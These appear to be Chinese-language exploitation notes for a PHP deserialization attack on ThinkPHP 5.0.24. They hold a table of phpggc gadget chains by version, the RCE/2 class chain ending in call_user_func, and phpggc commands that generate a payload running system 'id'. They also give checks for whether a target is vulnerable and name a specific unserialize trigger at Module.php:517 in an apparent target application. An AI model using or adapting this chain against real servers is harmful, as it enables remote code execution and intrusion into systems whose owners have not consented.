## 链清单（jsDelivr 文件树核对，2026-11-04）
| 链 | 声明版本 | 向量 | 备注 |
|---|---|---|---|
| ThinkPHP/RCE/2 | **5.0.24** | __destruct | 任意函数（含 system），作者 kemmio，0ctf/TCTF2021 writeup |
| ThinkPHP/FW/1 | 5.0.4-5.0.24 | __destruct | 文件写入 |
| ThinkPHP/RCE/1 | 5.1.x-5.2.x | __destruct | 仅 system()，第二参数不可控 |
| ThinkPHP/RCE/3、RCE/4 | -6.0.1+ | __destruct | 不适用 5.0.24 |
| ThinkPHP/FW/2 | 5.0.0-5.0.03 | __destruct | 不适用 |

## 类链（gadgets.php 关键结构）
```
think\process\pipes\Windows::__destruct
  $files = [ new think\model\Pivot ]                    // 触发 __toString/__call
    think\Model::__call → 取 $append=['getError'] 的 getter
      think\model\relation\HasOne  /  think\console\Output  /  think\db\Query
        think\session\driver\Memcached → think\cache\driver\Memcache
          think\Request{
              protected $get    = ["HEXENS<getAttr>no<" => $parameter],
              protected $filter = $function
          }  → call_user_func($filter, $parameter)
```

## 生成
```bash
git clone https://github.com/ambionics/phpggc && cd phpggc
./phpggc -l | grep -i think
./phpggc ThinkPHP/RCE/2 system 'id'                 # 明文 POP 串
./phpggc -b ThinkPHP/RCE/2 system 'id'              # base64 形态（部分入口需要）
```

## 适用性判据（目标侧）
- TP 版本必须 = 5.0.24（`THINK_VERSION` / 报错页 / composer.lock）
- PHP 5.6 可跑：链内无 `??`、无标量类型、无匿名类
- 依赖类均为框架自带：`process/pipes`、`model/Pivot`、`console/Output`、`db/Query`、`session/driver/Memcached`、`cache/driver/Memcache`、`Request` ⇒ 无反序列化类不在自动加载范围的问题
- 触发点：任何把用户可控数据交给 `unserialize()` 的位置（本例 `app/admin/controller/Module.php:517`）

## 前提（重要）
本链解决的是「有可控序列化明文之后怎么打通」。若入口前还有加密层（如 .kdsmod 模块包），必须先解决密文生成，POP 链不是瓶颈。

## 源文件
https://cdn.jsdelivr.net/gh/ambionics/phpggc@master/gadgetchains/ThinkPHP/RCE/2/gadgets.php
https://cdn.jsdelivr.net/gh/ambionics/phpggc@master/gadgetchains/ThinkPHP/FW/1/gadgets.php